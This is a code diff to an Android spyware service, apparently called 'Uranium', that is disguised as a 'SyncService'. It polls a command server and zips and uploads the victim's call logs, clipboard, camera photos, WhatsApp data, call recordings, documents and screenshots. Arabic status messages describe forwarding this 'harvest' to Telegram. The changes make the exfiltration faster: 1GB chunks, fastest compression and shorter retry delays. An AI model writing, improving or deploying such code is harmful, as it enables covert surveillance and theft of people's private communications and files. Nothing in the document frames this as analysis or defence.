@@ -74,8 +74,8 @@ class SyncService : Service() {
                     conn.setRequestProperty("X-Node-Model", nodeModel)
                     conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                     conn.doOutput = true
-                    conn.connectTimeout = 10000
-                    conn.readTimeout = 10000
+                    conn.connectTimeout = 8000
+                    conn.readTimeout = 8000
 
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
@@ -108,19 +108,19 @@ class SyncService : Service() {
                                 val data = readCallLogs()
                                 processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
                             } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/DCIM", "Camera_DCIM")
                             } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/Download", "Storage_Download")
                             } else if (responseStr.contains("EXTRACT_AUDIO")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/Music", "Audio_Music")
                             } else if (responseStr.contains("EXTRACT_DOCS")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/Documents", "Documents_Folder")
                             } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/Recordings", "Call_Recordings")
                             } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/WhatsApp", "WhatsApp_Data")
                             } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
-                                streamFolderDirect(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
+                                streamFolderMaxSpeed(deviceId, nodeModel, "/storage/emulated/0/Pictures/Screenshots", "Screenshots")
                             } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
                                 val data = readClipboard()
                                 processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
@@ -135,9 +135,9 @@ class SyncService : Service() {
                     }
                     conn.disconnect()
 
-                    delay(3000L)
+                    delay(2000L)
                 } catch (e: Exception) {
-                    delay(5000L)
+                    delay(3000L)
                 }
             }
         }
@@ -156,8 +156,7 @@ class SyncService : Service() {
         }
     }
 
-    // نظام البث الفوري والتنظيف التلقائي لمنع أي تراكم في التخزين المؤقت
-    private fun streamFolderDirect(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
+    private fun streamFolderMaxSpeed(nodeId: String, nodeModel: String, targetDirPath: String, prefix: String) {
         try {
             val dir = File(targetDirPath)
             if (!dir.exists() || !dir.isDirectory) {
@@ -165,14 +164,16 @@ class SyncService : Service() {
                 return
             }
 
-            sendReportToServer(nodeId, nodeModel, "⚡ [البث الفوري] بدء سحب وتوجيه مجلد $prefix إلى تليجرام بأمر السلطان...")
+            sendReportToServer(nodeId, nodeModel, "⚡ [السرعة القصوى] بدء سحب وضغط أجزاء 1GB لمجلد $prefix بأمر السلطان...")
 
             var partIndex = 1
             var fileCount = 0
             var zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
             var fos = FileOutputStream(zipFile)
             var zipOut = ZipOutputStream(fos)
-            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)
+            zipOut.setLevel(Deflater.BEST_SPEED)
+
+            val CHUNK_TARGET_SIZE = 1024L * 1024L * 1024L
 
             dir.walkTopDown().forEach { file ->
                 if (file.isFile && file.length() > 0) {
@@ -183,8 +184,7 @@ class SyncService : Service() {
                         zipOut.closeEntry()
                         fileCount++
 
-                        // إذا وصل حجم الجزء إلى 25 ميجابايت، نغلقه ونرفعه فوراً لتليجرام ونحذفه من الكاش للحفاظ على نظافة التخزين
-                        if (zipFile.length() >= 25 * 1024 * 1024 || fileCount >= 250) {
+                        if (zipFile.length() >= CHUNK_TARGET_SIZE) {
                             zipOut.finish()
                             zipOut.flush()
                             zipOut.close()
@@ -192,7 +192,7 @@ class SyncService : Service() {
 
                             val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                             uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
-                            sendReportToServer(nodeId, nodeModel, "📦 رفع الجزء (${partIndex}) من $prefix (${String.format("%.2f", sizeMB)} MB) وتم تنظيف الكاش.")
+                            sendReportToServer(nodeId, nodeModel, "📦 تم رفع الجزء (${partIndex}) من $prefix بحجم (${String.format("%.2f", sizeMB)} MB) وتم مسح المؤقت فوراً.")
                             
                             try { zipFile.delete() } catch (ex: Exception) {}
                             partIndex++
@@ -200,7 +200,7 @@ class SyncService : Service() {
                             zipFile = File(cacheDir, "Uranium_${prefix}_part${partIndex}_${System.currentTimeMillis()}.zip")
                             fos = FileOutputStream(zipFile)
                             zipOut = ZipOutputStream(fos)
-                            zipOut.setLevel(Deflater.DEFAULT_COMPRESSION)
+                            zipOut.setLevel(Deflater.BEST_SPEED)
                         }
                     } catch (e: Exception) {}
                 }
@@ -214,13 +214,13 @@ class SyncService : Service() {
             if (zipFile.exists() && zipFile.length() > 0) {
                 val sizeMB = zipFile.length() / (1024.0 * 1024.0)
                 uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
-                sendReportToServer(nodeId, nodeModel, "✅ [اكتمال حصاد $prefix] الجزء النهائي تم إرساله لتليجرام بنجاح (${String.format("%.2f", sizeMB)} MB).")
+                sendReportToServer(nodeId, nodeModel, "✅ [اكتمال حصاد $prefix] الجزء النهائي تم إرساله لتليجرام (${String.format("%.2f", sizeMB)} MB) ونظافة تامة للتخزين.")
                 try { zipFile.delete() } catch (ex: Exception) {}
             } else {
                 try { zipFile.delete() } catch (ex: Exception) {}
             }
         } catch (e: Exception) {
-            sendReportToServer(nodeId, nodeModel, "❌ خطأ في بث $prefix: ${e.message}")
+            sendReportToServer(nodeId, nodeModel, "❌ خطأ في سحب $prefix: ${e.message}")
         }
     }
 
@@ -236,8 +236,8 @@ class SyncService : Service() {
                 conn.setRequestProperty("Content-Type", "application/octet-stream")
                 conn.doOutput = true
                 conn.setChunkedStreamingMode(0)
-                conn.connectTimeout = 180000
-                conn.readTimeout = 180000
+                conn.connectTimeout = 300000
+                conn.readTimeout = 300000
 
                 FileInputStream(file).use { fis ->
                     conn.outputStream.use { os ->
@@ -250,7 +250,7 @@ class SyncService : Service() {
                 if (code == 200) return
             } catch (e: Exception) {
                 if (attempt == 5) return
-                Thread.sleep(3000L)
+                Thread.sleep(2000L)
             }
         }
     }
